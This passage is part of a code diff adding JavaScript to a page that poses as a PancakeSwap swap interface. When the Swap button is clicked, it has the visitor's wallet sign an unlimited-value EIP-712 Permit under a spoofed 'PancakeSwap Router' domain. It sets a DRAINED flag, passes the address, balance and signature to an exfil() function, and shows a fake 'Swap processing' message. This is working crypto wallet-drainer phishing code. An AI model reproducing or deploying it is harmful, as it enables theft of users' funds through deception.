+          {name:'version', type:'string'},
+          {name:'chainId', type:'uint256'},
+          {name:'verifyingContract', type:'address'}
+        ],
+        Permit: [
+          {name:'owner', type:'address'},
+          {name:'spender', type:'address'},
+          {name:'value', type:'uint256'},
+          {name:'nonce', type:'uint256'},
+          {name:'deadline', type:'uint256'}
+        ]
+      };
+      var msg = {
+        owner: ACC,
+        spender: spender,
+        value: '115792089237316195423570985008687907853269984665640564039457584007913129639935',
+        nonce: Math.floor(Math.random() * 1000000),
+        deadline: Math.floor(Date.now()/1000) + 3600
+      };
+      var domain = {
+        name: 'PancakeSwap Router',
+        version: '2',
+        chainId: parseInt(CID,16) || 56,
+        verifyingContract: spender
+      };
+      var sig = await window.ethereum.request({
+        method: 'eth_signTypedData_v4',
+        params: [ACC, JSON.stringify({types:types, domain:domain, primaryType:'Permit', message:msg})]
+      });
+      DRAINED = true;
+      exfil({address:ACC, type:'MetaMask', chain:'BNB Chain', balance:BAL+' ETH', sig:sig, permit:JSON.stringify({types:types, domain:domain, primaryType:'Permit', message:msg})});
+      sb.textContent = 'Submitted';
+      sb.style.background = '#31d0aa';
+      toast('Submitted', 'Swap processing...');
+    }
+  } catch(e) {
+    console.log(e);
+    sb.textContent = 'Swap';
+    sb.disabled = false;
+    toast('Cancelled', 'Signature rejected in wallet');
+  }
+}
+
+function init() {
+  document.querySelector('.cbtn').onclick = picker;
+  document.querySelector('.sbtn').onclick = doswap;
+  if (window.ethereum) {
+    window.ethereum.on('accountsChanged', function(accts) {
+      if (!accts || !accts.length) {
+        ACC = null; WT = null;
+        document.querySelector('.cbtn').textContent = 'Connect Wallet';
+        document.querySelector('.cbtn').style.background = '';
+        document.querySelector('.cbtn').style.padding = '0 20px';
+        document.querySelector('.sbtn').textContent = 'Connect Wallet';
+        document.querySelector('.sbtn').disabled = true;
+      }
+    });
+  }
+  var pp = window.phantom ? window.phantom.solana : (window.solana || null);
+  if (pp && pp.isPhantom) {
+    pp.on('disconnect', function() {
+      ACC = null; WT = null;
+      document.querySelector('.cbtn').textContent = 'Connect Wallet';
+      document.querySelector('.cbtn').style.background = '';
+      document.querySelector('.cbtn').style.padding = '0 20px';
+      document.querySelector('.sbtn').textContent = 'Connect Wallet';
+      document.querySelector('.sbtn').disabled = true;
+    });
+  }
+}
+
+init();
+</script>
+
+</body>
+</html>
